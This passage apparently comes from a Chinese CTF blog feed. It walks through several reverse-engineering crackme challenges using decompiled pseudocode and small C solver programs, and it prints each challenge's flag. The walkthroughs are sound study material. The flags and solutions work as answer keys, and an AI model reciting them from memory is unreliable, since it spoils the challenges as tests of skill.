class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__cdecl sub_401260(int a1, unsigned int a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v3; &#x2F;&#x2F; ST24_4</span><br><span class="line">  int v4; &#x2F;&#x2F; ST2C_4</span><br><span class="line">  int v5; &#x2F;&#x2F; [esp+Ch] [ebp-24h]</span><br><span class="line">  int v6; &#x2F;&#x2F; [esp+10h] [ebp-20h]</span><br><span class="line">  int v7; &#x2F;&#x2F; [esp+14h] [ebp-1Ch]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+1Ch] [ebp-14h]</span><br><span class="line">  _BYTE *v9; &#x2F;&#x2F; [esp+24h] [ebp-Ch]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+28h] [ebp-8h]</span><br><span class="line">  unsigned int v11; &#x2F;&#x2F; [esp+2Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v9 &#x3D; malloc(4 * ((a2 + 2) &#x2F; 3) + 1);</span><br><span class="line">  if ( !v9 )</span><br><span class="line">    return 0;</span><br><span class="line">  v11 &#x3D; 0;</span><br><span class="line">  v10 &#x3D; 0;</span><br><span class="line">  while ( v11 &lt; a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v11 &gt;&#x3D; a2 )</span><br><span class="line">      v7 &#x3D; 0;</span><br><span class="line">    else</span><br><span class="line">      v7 &#x3D; *(v11++ + a1);</span><br><span class="line">    if ( v11 &gt;&#x3D; a2 )</span><br><span class="line">      v6 &#x3D; 0;</span><br><span class="line">    else</span><br><span class="line">      v6 &#x3D; *(v11++ + a1);</span><br><span class="line">    if ( v11 &gt;&#x3D; a2 )</span><br><span class="line">      v5 &#x3D; 0;</span><br><span class="line">    else</span><br><span class="line">      v5 &#x3D; *(v11++ + a1);</span><br><span class="line">    v3 &#x3D; v5 + (v7 &lt;&lt; 16) + (v6 &lt;&lt; 8);</span><br><span class="line">    v9[v10] &#x3D; byte_413000[(v3 &gt;&gt; 18) &amp; 0x3F];</span><br><span class="line">    v4 &#x3D; v10 + 1;</span><br><span class="line">    v9[v4++] &#x3D; byte_413000[(v3 &gt;&gt; 12) &amp; 0x3F];</span><br><span class="line">    v9[v4++] &#x3D; byte_413000[(v3 &gt;&gt; 6) &amp; 0x3F];</span><br><span class="line">    v9[v4] &#x3D; byte_413000[v5 &amp; 0x3F];</span><br><span class="line">    v10 &#x3D; v4 + 1;</span><br><span class="line">  &#125;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; dword_413040[a2 % 3]; ++i )</span><br><span class="line">    v9[4 * ((a2 + 2) &#x2F; 3) - i - 1] &#x3D; 61;</span><br><span class="line">  v9[4 * ((a2 + 2) &#x2F; 3)] &#x3D; 0;</span><br><span class="line">  return v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再字符串中有：ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/<br>很明显的base64加密，但密码表变了，根据密码表的变化，将密文转换成正常的base64.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">int i;</span><br><span class="line">char flag[52]&#x3D;&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;;</span><br><span class="line">for(i&#x3D;0;i&lt;52;i++)</span><br><span class="line">&#123;</span><br><span class="line">if ((flag[i]&lt;&#x3D;&#39;W&#39;&amp;&amp;flag[i]&gt;&#x3D;&#39;A&#39;)||(flag[i]&lt;&#x3D;&#39;w&#39;&amp;&amp;flag[i]&gt;&#x3D;&#39;a&#39;))</span><br><span class="line">    flag[i]+&#x3D;3;  </span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;X&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;C&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;Y&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;B&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;Z&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;A&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;x&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;c&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;y&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;b&#39;;</span><br><span class="line">        else if (flag[i] &#x3D;&#x3D; &#39;z&#39;)</span><br><span class="line">         flag[i] &#x3D; &#39;a&#39;;</span><br><span class="line">        else if (flag[i]&gt;&#x3D;0&amp;&amp;flag[i]&lt;&#x3D;9)</span><br><span class="line">         flag[i] &#x3D; i;</span><br><span class="line">         printf(&quot;%c&quot;,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出base64解码就行。</p><blockquote><p>flag{sh00ting_phish_in_a_barrel@flare-on.com}</p></blockquote><h1 id="Universe-final-answer"><a href="#Universe-final-answer" class="headerlink" title="Universe_final_answer"></a>Universe_final_answer</h1><p>ida64打开<br>进入main函数，然后跳转至本题的关键函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">bool __fastcall sub_860(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; &#x2F;&#x2F; ecx</span><br><span class="line">  int v2; &#x2F;&#x2F; esi</span><br><span class="line">  int v3; &#x2F;&#x2F; edx</span><br><span class="line">  int v4; &#x2F;&#x2F; er9</span><br><span class="line">  int v5; &#x2F;&#x2F; er11</span><br><span class="line">  int v6; &#x2F;&#x2F; ebp</span><br><span class="line">  int v7; &#x2F;&#x2F; ebx</span><br><span class="line">  int v8; &#x2F;&#x2F; er8</span><br><span class="line">  int v9; &#x2F;&#x2F; er10</span><br><span class="line">  bool result; &#x2F;&#x2F; al</span><br><span class="line">  int v11; &#x2F;&#x2F; [rsp+0h] [rbp-38h]</span><br><span class="line"></span><br><span class="line">  v1 &#x3D; a1[1];</span><br><span class="line">  v2 &#x3D; *a1;</span><br><span class="line">  v3 &#x3D; a1[2];</span><br><span class="line">  v4 &#x3D; a1[3];</span><br><span class="line">  v5 &#x3D; a1[4];</span><br><span class="line">  v6 &#x3D; a1[6];</span><br><span class="line">  v7 &#x3D; a1[5];</span><br><span class="line">  v8 &#x3D; a1[7];</span><br><span class="line">  v9 &#x3D; a1[8];</span><br><span class="line">  result &#x3D; 0;</span><br><span class="line">  if ( -85 * v9 + 58 * v8 + 97 * v6 + v7 + -45 * v5 + 84 * v4 + 95 * v2 - 20 * v1 + 12 * </span><br><span class="line">    v3 &#x3D;&#x3D; 12613 )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 &#x3D; a1[9];</span><br><span class="line">    if ( 30 * v11 + -70 * v9 + -122 * v6 + -81 * v7 + -66 * v5 + -115 * v4 + -41 * v3 + -86 * v1 - 15 * v2 - 30 * v8 &#x3D;&#x3D; -54400</span><br><span class="line">      &amp;&amp; -103 * v11 + 120 * v8 + 108 * v7 + 48 * v4 + -89 * v3 + 78 * v1 - 41 * v2 + 31 * v5 - (v6 &lt;&lt; 6) - 120 * v9 &#x3D;&#x3D; -10283</span><br><span class="line">      &amp;&amp; 71 * v6 + (v7 &lt;&lt; 7) + 99 * v5 + -111 * v3 + 85 * v1 + 79 * v2 - 30 * v4 - 119 * v8 + 48 * v9 - 16 * v11 &#x3D;&#x3D; 22855</span><br><span class="line">      &amp;&amp; 5 * v11 + 23 * v9 + 122 * v8 + -19 * v6 + 99 * v7 + -117 * v5 + -69 * v3 + 22 * v1 - 98 * v2 + 10 * v4 &#x3D;&#x3D; -2944</span><br><span class="line">      &amp;&amp; -54 * v11 + -23 * v8 + -82 * v3 + -85 * v2 + 124 * v1 - 11 * v4 - 8 * v5 - 60 * v7 + 95 * v6 + 100 * v9 &#x3D;&#x3D; -2222</span><br><span class="line">      &amp;&amp; -83 * v11 + -111 * v7 + -57 * v2 + 41 * v1 + 73 * v3 - 18 * v4 + 26 * v5 + 16 * v6 + 77 * v8 - 63 * v9 &#x3D;&#x3D; -13258</span><br><span class="line">      &amp;&amp; 81 * v11 + -48 * v9 + 66 * v8 + -104 * v6 + -121 * v7 + 95 * v5 + 85 * v4 + 60 * v3 + -85 * v2 + 80 * v1 &#x3D;&#x3D; -1559</span><br><span class="line">      &amp;&amp; 101 * v11 + -85 * v9 + 7 * v6 + 117 * v7 + -83 * v5 + -101 * v4 + 90 * v3 + -28 * v1 + 18 * v2 - v8 &#x3D;&#x3D; 6308 )</span><br><span class="line">    &#123;</span><br><span class="line">      result &#x3D; 99 * v11 + -28 * v9 + 5 * v8 + 93 * v6 + -18 * v7 + -127 * v5 + 6 * v4 + -9 * v3 + -93 * v1 + 58 * v2 &#x3D;&#x3D; -1697;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是解方程，解出来后v2和v1互换，v7和v6互换。<br>结果：F0uRTy_7w@，输入到程序中得到flag，但我不会。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;F0uRTy_7w@_42&#125;</span><br></pre></td></tr></table></figure><h1 id="basic-re"><a href="#basic-re" class="headerlink" title="basic-re"></a>basic-re</h1><p>ida64打开，字符串里直接看到flag，这种题怎么这么靠后。</p><blockquote><p>flag{str1ngs_1s_y0ur_fr13nd}</p></blockquote><h1 id="hello-world-go"><a href="#hello-world-go" class="headerlink" title="hello_world_go"></a>hello_world_go</h1><p>ida64打开，进入main函数<br><img src="/2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hello_world_go1.PNG"></p><p><img src="/2021/03/01/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/hello_world_go2.PNG"></p><blockquote><p>flag{hello_world_gogogo}</p></blockquote><h1 id="Cr0ssfun"><a href="#Cr0ssfun" class="headerlink" title="Cr0ssfun"></a>Cr0ssfun</h1><p>ida64打开，转一下字符就是flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a1[10] &#x3D;&#x3D; &#39;p&#39; &amp;&amp; a1[13] &#x3D;&#x3D; &#39;@&#39; &amp;&amp; a1[3] &#x3D;&#x3D; &#39;f&#39; &amp;&amp; a1[26] &#x3D;&#x3D; &#39;r&#39; &amp;&amp; a1[20] &#x3D;&#x3D; &#39;e&#39;</span><br><span class="line">a1[7] &#x3D;&#x3D; &#39;0&#39; &amp;&amp; a1[16] &#x3D;&#x3D; &#39;_&#39; &amp;&amp; a1[11] &#x3D;&#x3D; &#39;p&#39; &amp;&amp; a1[23] &#x3D;&#x3D; &#39;e&#39; &amp;&amp; a1[30] &#x3D;&#x3D; &#39;u&#39;</span><br><span class="line">*a1 &#x3D;&#x3D; &#39;w&#39; &amp;&amp; a1[6] &#x3D;&#x3D; &#39;2&#39; &amp;&amp; a1[22] &#x3D;&#x3D; &#39;s&#39; &amp;&amp; a1[31] &#x3D;&#x3D; &#39;n&#39; &amp;&amp; a1[12] &#x3D;&#x3D; &#39;_&#39;</span><br><span class="line">a1[15] &#x3D;&#x3D; &#39;d&#39; &amp;&amp; a1[8] &#x3D;&#x3D; &#39;&#123;&#39; &amp;&amp; a1[18] &#x3D;&#x3D; &#39;3&#39; &amp;&amp; a1[28] &#x3D;&#x3D; &#39;_&#39; &amp;&amp; a1[21] &#x3D;&#x3D; &#39;r&#39;</span><br><span class="line">a1[2] &#x3D;&#x3D; &#39;t&#39; &amp;&amp; a1[9] &#x3D;&#x3D; &#39;c&#39; &amp;&amp; a1[32] &#x3D;&#x3D; &#39;&#125;&#39; &amp;&amp; a1[19] &#x3D;&#x3D; &#39;v&#39; &amp;&amp; a1[5] &#x3D;&#x3D; &#39;0&#39;</span><br><span class="line">      &amp;&amp; a1[14] &#x3D;&#x3D; &#39;n&#39;</span><br><span class="line">a1[4] &#x3D;&#x3D; &#39;2&#39; &amp;&amp; a1[17] &#x3D;&#x3D; &#39;r&#39; &amp;&amp; a1[29] &#x3D;&#x3D; &#39;f&#39; &amp;&amp; a1[17] &#x3D;&#x3D; &#39;r&#39; &amp;&amp; a1[24] &#x3D;&#x3D; &#39;_&#39;</span><br><span class="line">a1[1] &#x3D;&#x3D; &#39;c&#39; &amp;&amp; a1[25] &#x3D;&#x3D; &#39;@&#39; &amp;&amp; a1[27] &#x3D;&#x3D; &#39;e&#39;</span><br></pre></td></tr></table></figure><p>整理一下顺序就行了。<br>flag{cpp_@nd_r3verse_@re_fun}</p><h1 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h1><p><a href="https://buuoj.cn/challenges#[ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020]easyre">题目链接</a><br>ida32打开，进入main函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char v4; &#x2F;&#x2F; [esp+12h] [ebp-2Eh]</span><br><span class="line">  char v5; &#x2F;&#x2F; [esp+13h] [ebp-2Dh]</span><br><span class="line">  char v6; &#x2F;&#x2F; [esp+14h] [ebp-2Ch]</span><br><span class="line">  char v7; &#x2F;&#x2F; [esp+15h] [ebp-2Bh]</span><br><span class="line">  char v8; &#x2F;&#x2F; [esp+16h] [ebp-2Ah]</span><br><span class="line">  char v9; &#x2F;&#x2F; [esp+17h] [ebp-29h]</span><br><span class="line">  char v10; &#x2F;&#x2F; [esp+18h] [ebp-28h]</span><br><span class="line">  char v11; &#x2F;&#x2F; [esp+19h] [ebp-27h]</span><br><span class="line">  char v12; &#x2F;&#x2F; [esp+1Ah] [ebp-26h]</span><br><span class="line">  char v13; &#x2F;&#x2F; [esp+1Bh] [ebp-25h]</span><br><span class="line">  char v14; &#x2F;&#x2F; [esp+1Ch] [ebp-24h]</span><br><span class="line">  char v15; &#x2F;&#x2F; [esp+1Dh] [ebp-23h]</span><br><span class="line">  int v16; &#x2F;&#x2F; [esp+1Eh] [ebp-22h]</span><br><span class="line">  int v17; &#x2F;&#x2F; [esp+22h] [ebp-1Eh]</span><br><span class="line">  int v18; &#x2F;&#x2F; [esp+26h] [ebp-1Ah]</span><br><span class="line">  __int16 v19; &#x2F;&#x2F; [esp+2Ah] [ebp-16h]</span><br><span class="line">  char v20; &#x2F;&#x2F; [esp+2Ch] [ebp-14h]</span><br><span class="line">  char v21; &#x2F;&#x2F; [esp+2Dh] [ebp-13h]</span><br><span class="line">  char v22; &#x2F;&#x2F; [esp+2Eh] [ebp-12h]</span><br><span class="line">  int v23; &#x2F;&#x2F; [esp+2Fh] [ebp-11h]</span><br><span class="line">  int v24; &#x2F;&#x2F; [esp+33h] [ebp-Dh]</span><br><span class="line">  int v25; &#x2F;&#x2F; [esp+37h] [ebp-9h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [esp+3Bh] [ebp-5h]</span><br><span class="line">  int i; &#x2F;&#x2F; [esp+3Ch] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 &#x3D; &#39;*&#39;;</span><br><span class="line">  v5 &#x3D; &#39;F&#39;;</span><br><span class="line">  v6 &#x3D; &#39;\&#39;&#39;;</span><br><span class="line">  v7 &#x3D; &#39;&quot;&#39;;</span><br><span class="line">  v8 &#x3D; &#39;N&#39;;</span><br><span class="line">  v9 &#x3D; &#39;,&#39;;</span><br><span class="line">  v10 &#x3D; &#39;&quot;&#39;;</span><br><span class="line">  v11 &#x3D; &#39;(&#39;;</span><br><span class="line">  v12 &#x3D; &#39;I&#39;;</span><br><span class="line">  v13 &#x3D; &#39;?&#39;;</span><br><span class="line">  v14 &#x3D; &#39;+&#39;;</span><br><span class="line">  v15 &#x3D; &#39;@&#39;;</span><br><span class="line">  printf(&quot;Please input:&quot;);</span><br><span class="line">  scanf(&quot;%s&quot;, &amp;v19);</span><br><span class="line">  if ( v19 !&#x3D; &#39;A&#39; || HIBYTE(v19) !&#x3D; &#39;C&#39; || v20 !&#x3D; &#39;T&#39; || v21 !&#x3D; &#39;F&#39; || v22 !&#x3D; &#39;&#123;&#39; || v26 </span><br><span class="line">  !&#x3D; &#39;&#125;&#39; )</span><br><span class="line">    return 0;</span><br><span class="line">  v16 &#x3D; v23;</span><br><span class="line">  v17 &#x3D; v24;</span><br><span class="line">  v18 &#x3D; v25;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 11; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(&amp;v4 + i) !&#x3D; _data_start__[*(&amp;v16 + i) - 1] )</span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;You are correct!&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入12个字符，这些字符代表的数字，就是_data_start__的下标+1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char </span><br><span class="line">  a[96]&#x3D;&#123;0x7E,0x7D,0x7C,0x7B,0x7A,0x79,0x78,0x77,0x76,0x75,0x74,0x73,0x72,0x71,0x70,0x6F,</span><br><span class="line">    0x6E,0x6D,0x6C,0x6B,0x6A,0x69,0x68,0x67,0x66,0x65,0x64,0x63,0x62,0x61,0x60,0x5F,</span><br><span class="line">    0x5E,0x5D,0x5C,0x5B,0x5A,0x59,0x58,0x57,0x56,0x55,0x54,0x53,0x52,0x51,0x50,0x4F,</span><br><span class="line">    0x4E,0x4D,0x4C,0x4B,0x4A,0x49,0x48,0x47,0x46,0x45,0x44,0x43,0x42,0x41,0x40,0x3F,</span><br><span class="line">    0x3E,0x3D,0x3C,0x3B,0x3A,0x39,0x38,0x37,0x36,0x35,0x34,0x33,0x32,0x31,0x30,0x2F,</span><br><span class="line">    0x2E,0x2D,0x2C,0x2B,0x2A,0x29,0x28,0x27,0x26,0x25,0x24,0x23,0x20,0x21,0x22,0x00,&#125;;</span><br><span class="line">int b[12]&#x3D;&#123;42,70,39,34,78,44,34,40,73,63,43,64&#125;;</span><br><span class="line">int i,j;</span><br><span class="line">for(i&#x3D;0;i&lt;12;i++)</span><br><span class="line">&#123;</span><br><span class="line">for(j&#x3D;0;j&lt;96;j++)</span><br><span class="line">&#123;</span><br><span class="line">if(a[j]&#x3D;&#x3D;b[i])</span><br><span class="line">printf(&quot;%c&quot;,j+1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{U9X_1S_W6@T?}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf——刮开有奖</title>
      <link href="2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/"/>
      <url>2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Buuctf——刮开有奖"><a href="#Buuctf——刮开有奖" class="headerlink" title="Buuctf——刮开有奖"></a>Buuctf——刮开有奖</h1><a id="more"></a><p><a href="https://buuoj.cn/challenges#%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96">题目链接</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-dialogboxparama">DialogBoxParamA函数</a><br><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getdlgitemtexta">GetDlgItemTextA函数</a></p><h2 id="1-查看文件信息"><a href="#1-查看文件信息" class="headerlink" title="1.查看文件信息"></a>1.查看文件信息</h2><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/1.png"></p><h2 id="2-分析伪代码"><a href="#2-分析伪代码" class="headerlink" title="2.分析伪代码"></a>2.分析伪代码</h2><p>32位ida打开，发现WinMain函数，然后查看伪代码。</p><p><img src="/2021/01/19/Buuctf%E2%80%94%E2%80%94%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/2.png"></p><p>进入DialogFunc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">BOOL __userpurge DialogFunc@&lt;eax&gt;(int a1@&lt;edi&gt;, int a2@&lt;esi&gt;, HWND hDlg, UINT a4, WPARAM </span><br><span class="line">a5, LPARAM a6)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v6; &#x2F;&#x2F; esi</span><br><span class="line">  const char *v7; &#x2F;&#x2F; edi</span><br><span class="line">  int v9; &#x2F;&#x2F; [esp+4h] [ebp-20030h]</span><br><span class="line">  int v10; &#x2F;&#x2F; [esp+8h] [ebp-2002Ch]</span><br><span class="line">  int v11; &#x2F;&#x2F; [esp+Ch] [ebp-20028h]</span><br><span class="line">  int v12; &#x2F;&#x2F; [esp+10h] [ebp-20024h]</span><br><span class="line">  int v13; &#x2F;&#x2F; [esp+14h] [ebp-20020h]</span><br><span class="line">  int v14; &#x2F;&#x2F; [esp+18h] [ebp-2001Ch]</span><br><span class="line">  int v15; &#x2F;&#x2F; [esp+1Ch] [ebp-20018h]</span><br><span class="line">  int v16; &#x2F;&#x2F; [esp+20h] [ebp-20014h]</span><br><span class="line">  int v17; &#x2F;&#x2F; [esp+24h] [ebp-20010h]</span><br><span class="line">  int v18; &#x2F;&#x2F; [esp+28h] [ebp-2000Ch]</span><br><span class="line">  int v19; &#x2F;&#x2F; [esp+2Ch] [ebp-20008h]</span><br><span class="line">  CHAR String; &#x2F;&#x2F; [esp+30h] [ebp-20004h]</span><br><span class="line">  char v21; &#x2F;&#x2F; [esp+31h] [ebp-20003h]</span><br><span class="line">  char v22; &#x2F;&#x2F; [esp+32h] [ebp-20002h]</span><br><span class="line">  char v23; &#x2F;&#x2F; [esp+33h] [ebp-20001h]</span><br><span class="line">  char v24; &#x2F;&#x2F; [esp+34h] [ebp-20000h]</span><br><span class="line">  char v25; &#x2F;&#x2F; [esp+10030h] [ebp-10004h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [esp+10031h] [ebp-10003h]</span><br><span class="line">  char v27; &#x2F;&#x2F; [esp+10032h] [ebp-10002h]</span><br><span class="line">  int v28; &#x2F;&#x2F; [esp+20028h] [ebp-Ch]</span><br><span class="line">  int v29; &#x2F;&#x2F; [esp+2002Ch] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  __alloca_probe();</span><br><span class="line">  if ( a4 &#x3D;&#x3D; 272 )</span><br><span class="line">    return 1;</span><br><span class="line">  v29 &#x3D; a2;</span><br><span class="line">  v28 &#x3D; a1;</span><br><span class="line">  if ( a4 !&#x3D; 273 )</span><br><span class="line">    return 0;</span><br><span class="line">  if ( a5 &#x3D;&#x3D; 1001 )</span><br><span class="line">  &#123;</span><br><span class="line">    memset(&amp;String, 0, 0xFFFFu);</span><br><span class="line">    GetDlgItemTextA(hDlg, 1000, &amp;String, 0xFFFF);</span><br><span class="line">    if ( strlen(&amp;String) &#x3D;&#x3D; 8 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 &#x3D; 90;</span><br><span class="line">      v10 &#x3D; 74;</span><br><span class="line">      v11 &#x3D; 83;</span><br><span class="line">      v12 &#x3D; 69;</span><br><span class="line">      v13 &#x3D; 67;</span><br><span class="line">      v14 &#x3D; 